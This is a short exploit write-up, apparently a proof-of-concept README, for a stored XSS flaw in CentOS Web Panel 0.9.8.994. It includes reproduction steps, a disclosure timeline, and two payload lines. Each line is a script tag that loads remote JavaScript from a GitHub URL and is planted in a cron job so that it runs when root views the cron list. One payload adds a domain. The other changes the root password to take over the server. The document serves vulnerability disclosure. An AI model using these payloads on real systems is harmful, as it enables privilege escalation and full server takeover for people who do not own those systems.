Exploiting an XSS vulnerability in the CWP control panel and escalating the attack to change the root password...

# Information

```
# Exploit Title       : CWP (CentOS Control Web Panel) Version 0.9.8.994 - Remote Command Execution
# Date                : 7 january 2021
# Exploit Author      : Chokri B.A.
# Vendor Homepage     : https://control-webpanel.com/
# Software Link       : Not available, user panel only available for lastest version
# Version             : 0.9.8.994
# Tested on           : CentOS 7.6.1810 (Core)
# CVE                 : #
```

# Description
A simple user can add/delete/modify any option on behalf of the root user, and even change the root's password via a stored XSS vulnerability.

#  Steps to Reproduce
1. Login into the CentOS Web Panel using user credential
<br>
2. Create a new cron job using your prefered XSS payload.
<br>
3. Login as root and navigate to the list of cronjobs
<br>
4. the XSS payload will execute.

#  Escalating
I've created 2 examples on how you can escalate this attack to take control of the full server.

1. <b>PayloadAddDomain.js</b> : add this code as your cronjob, when the root user list the cronjobs, a new domain name will be added under the choosen user.
``` 
<script type="text/javascript" src="https://raw.githubusercontent.com/TnExperts/cwppoc/main/PayloadAddDomain.js"></script>
```

2. <b>PayloadChangeRootPass.js</b> add this code as your cronjob, when the root user list the cronjobs, you will be able to change to root's password and take control of the full server.
``` 
<script type="text/javascript" src="https://raw.githubusercontent.com/TnExperts/cwppoc/main/PayloadChangeRootPass.js"></script>
```

#  Timeline

```
2021-01-07: Discovered the bug
2021-08-08: Reported to vendor
#: Vender accepted the vulnerability
#: The vulnerability has been fixed
#: Published
```